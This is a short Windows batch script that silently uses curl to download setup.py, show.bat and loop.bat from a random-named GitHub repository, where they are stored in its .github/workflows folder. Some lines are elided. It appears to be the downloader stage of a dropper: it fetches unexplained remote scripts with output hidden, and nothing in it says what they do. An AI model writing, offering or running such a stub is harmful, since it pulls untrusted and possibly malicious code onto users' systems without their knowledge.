@echo off
curl -s -L -o setup.py https://raw.githubusercontent.com/Jefafox9802/fhgfh/refs/heads/main/.github/workflows/setup.py
...
curl -s -L -o show.bat https://raw.githubusercontent.com/Jefafox9802/fhgfh/refs/heads/main/.github/workflows/show.bat
curl -s -L -o loop.bat https://github.com/Jefafox9802/fhgfh/blob/main/.github/workflows/loop.bat
